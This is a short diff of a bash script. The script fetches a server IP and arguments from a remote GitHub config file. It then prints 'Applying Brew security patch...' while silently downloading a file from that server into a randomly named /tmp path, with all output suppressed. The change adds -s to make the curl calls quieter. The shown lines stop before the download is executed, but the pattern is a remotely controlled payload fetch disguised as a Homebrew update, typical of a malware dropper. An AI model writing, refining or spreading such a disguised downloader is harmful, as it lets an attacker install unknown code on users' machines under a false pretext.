@@ -1,11 +1,11 @@
 #!/bin/bash
 
 tmp="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 6)"
-ip="$(curl https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
+ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
 echo "$ip is ip"
-l="$(curl https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^list | cut -f2 -d'=')"
+l="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^list | cut -f2 -d'=')"
 echo "$list is list"
-args="$(curl https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
+args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
 echo "$args is args"
 echo "Applying Brew security patch..."
 curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
